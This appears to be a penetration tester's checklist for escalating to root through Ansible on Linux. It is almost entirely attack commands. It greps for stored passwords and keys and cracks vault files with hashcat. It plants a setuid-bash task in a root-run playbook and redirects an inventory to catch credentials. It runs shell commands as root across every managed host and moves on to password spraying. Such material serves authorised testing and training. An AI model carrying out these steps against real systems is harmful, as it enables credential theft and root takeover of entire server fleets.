# Linux privesc: Ansible

## Before I start
- [ ] A shell on the control node or on a managed host, with /etc/ansible the first place to look: :Pb linux-creds

## Read what is there
cat /etc/ansible/ansible.cfg
cat /etc/ansible/hosts
grep -rniE 'ansible_password|ansible_become_pass|password:|api_key|private_key' /etc/ansible /opt /srv /home 2>/dev/null
- [ ] The [privilege_escalation] block in ansible.cfg says how become reaches root
- [ ] private_key_file names an SSH key I may be able to read

## Crack a vault
find / -name '*.yml' 2>/dev/null | xargs grep -l 'ANSIBLE_VAULT' 2>/dev/null
On Kali, with the vault file sent back into loot/ as <File>, and THE-WORDLIST a short list of my own:
ansible2john <File> > vault.hash
hashcat -m 16900 --username vault.hash THE-WORDLIST -r /usr/share/hashcat/rules/best64.rule
ansible-vault decrypt <File> --ask-vault-pass
- [ ] PBKDF2 with 10000 rounds, so slow: a targeted list, not rockyou: :Pb wordlists, :Pb hash-cracking
- [ ] ansible-vault not installed: sudo apt install -y ansible-core

## A playbook or inventory I can write
crontab -l; ls -la /etc/cron*; ps aux | grep -i ansible
- [ ] Root's cron or ansible-pull runs a playbook I can edit: a task added with shell: chmod u+s /bin/bash, then bash -p
- [ ] An inventory I can write: a host pointed at my machine, to catch what root's next run sends: :Pb cron

## I can run Ansible myself
ansible all -i /etc/ansible/hosts -m shell -a 'id' --become
- [ ] become with no password is root on every managed host at once
- [ ] A playbook of my own run the same way: ansible-playbook -i /etc/ansible/hosts THE-PLAYBOOK --become

## If it fails
- [ ] become asks for a password: the vault cracked first, since its password is often the become password
- [ ] No cron job pulls: a CI server that runs the playbooks, :Pb jenkins

## Next
- [ ] Root on the managed hosts: :Pb linux-creds on each
- [ ] Service passwords recovered, tried everywhere: :Pb spraying
